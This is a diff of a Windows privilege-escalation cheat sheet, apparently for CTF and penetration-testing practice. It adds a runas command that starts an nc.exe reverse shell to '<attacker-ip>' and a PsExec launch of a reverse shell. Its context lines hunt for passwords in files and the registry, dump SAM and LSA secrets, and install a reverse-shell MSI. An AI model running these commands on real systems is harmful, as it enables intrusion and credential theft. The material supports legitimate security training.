@@ -25,7 +25,10 @@
 Token impersonation    
 
     load incognito
-    list_tokens -u
+    list_tokens -u   
+Getsystem: tries well known priv esc exploits    
+
+    getsystem    
 ### Powershell
     powershell.exe -nop -ep bypass    
     Get-ExecutionPolicy    
@@ -50,6 +53,7 @@ Token impersonation
     
 ## Scripts 
 **You might want to check for AV first!**  
+For most CTFS all you should need is winPEAS   
 [Scripts Reference](https://www.hackingarticles.in/window-privilege-escalation-automated-script/)     
 [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)   
 [Other compiled binaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)  
@@ -66,14 +70,6 @@ Token impersonation
 ## Checklists    
 [HackTricks](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)  
 [Fuzzy security](http://www.fuzzysecurity.com/tutorials/16.html) 
-
-____   
-
-# Manual Enum 
-https://lolbas-project.github.io/#   
-
-Windows 10 Exploits 
-https://github.com/nu11secur1ty/Windows10Exploits    
 
 ## Privilege Exploits 
 [Reference](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)   
@@ -190,6 +186,12 @@ Confirm perms - overwrite the program? (May need to upload accesschk)
     #upload reverse shell to C:\temp and run    
     msiexec /quiet /qn /i C:\Temp\reverse.msi
 ## Passwords  
+Use creds locally:     
+
+    C:\Windows\System32\runas.exe /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"       
+        PsExec64.exe /accepteula -i -u admin -p password C:\Temp\reverse.exe     
+Search for creds:   
+
 [LaZagne](https://github.com/AlessandroZ/LaZagne/tree/master): search for creds.    
 
     laZagne.exe all    
@@ -200,7 +202,6 @@ Run from C:\ (recursive search).
 
     findstr /si password *.xml *.ini *.txt *.config 2>nul    
     dir /s *pass* == *vnc* == *.config* 2>nul    
-    
     dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul    
     
 DMP Files (possible base64 passwords)  - find or create from processes
@@ -220,11 +221,8 @@ Unattend files (could contain base64 encoded passwords):
     cmdkey /list   
     dir C:\Users\username\AppData\Local\Microsoft\Credentials\   
     dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\   
-    
     runas /savecred /user:[user name] C:\PrivEsc\reverse.exe  
-    
-    PsExec64.exe /accepteula -i -u admin -p password C:\Temp\reverse.exe  
-    
+
 ### Creds in Registry 
     reg query HKLM /f password /t REG_SZ /s
     reg query HKCU /f password /t REG_SZ /s 
@@ -235,11 +233,9 @@ Unattend files (could contain base64 encoded passwords):
     %SYSTEMROOT%\repair\system
     %SYSTEMROOT%\System32\config\SYSTEM
     %SYSTEMROOT%\System32\config\RegBack\system 
-### Extracting SAM and SYSTEM   
-
+### Extracting SAM and SYSTEM    
 [CVE-2021-36934, the SeriousSAM local privilege escalation](https://github.com/HuskyHacks/ShadowSteal)  
-
-Manually or use [mimikatz](https://github.com/gentilkiwi/mimikatz) 
+Extract Mmanually or use [mimikatz](https://github.com/gentilkiwi/mimikatz) 
 
 Manually:
 
@@ -252,8 +248,7 @@ Manually:
      pwdump.py sys_backup.hiv sec_backup.hiv
      
      #dump LSA secrets with Impacket
-     lsadump.py sys_backup.hiv sec_backup.hiv
-
+     lsadump.py sys_backup.hiv sec_backup.hiv          
 
 Extract hashes with Mimikatz (Windows Defender will catch this so it's better to use the below method):    
 
@@ -277,9 +272,13 @@ Check system architechure:
 
     systeminfo | findstr /B /C:"OS Name" /C:"OS Version"     
     
-Check for Hotfixes: 
+Check for Hotfixes:    
+
     wmic qfe get Caption,Description,HotFixID,InstalledOn     
-    
+
+Tools to use   
+https://github.com/bitsadmin/wesng      
+https://github.com/rasta-mouse/Watson   
 ### Kernel Exploit Isn't Working
 [x32-bit vs x64-bit](https://spencerdodd.github.io/2017/07/20/WOW64/) 
 Check arch of running Powershell process (could get a 32 bit process on 64 bit machine if payload uses relative path)
@@ -301,9 +300,6 @@ Absolute PowerShell executable paths:
     C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe
     C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe
     
-### Tools
-https://github.com/bitsadmin/wesng   
-https://github.com/rasta-mouse/Watson   
 ### Precompiled Kernel Exploits
 https://github.com/SecWiki/windows-kernel-exploits   
 
@@ -311,9 +307,11 @@ https://github.com/SecWiki/windows-kernel-exploits
 [Print Demon](https://windows-internals.com/printdemon-cve-2020-1048/)  
 [SYSTEM Nightmare](https://github.com/GossiTheDog/SystemNightmare) Print nightmare implementation   
 [CVE 2019-1388](https://github.com/jas502n/CVE-2019-1388)   
+[Windows 10 Exploits](https://github.com/nu11secur1ty/Windows10Exploits)    
 ____   
 
 # Transferring Files    
+[Living off the Land](https://lolbas-project.github.io/#)      
 [Reference - 15 ways to download files](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-download-a-file/)     
 [Windows oneliners to download remote payload and execute arbitrary code](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)   
 [Windows One liners for file uploading](https://www.asafety.fr/en/vuln-exploit-poc/windows-dos-powershell-upload-de-fichier-en-ligne-de-commande-one-liner/)     
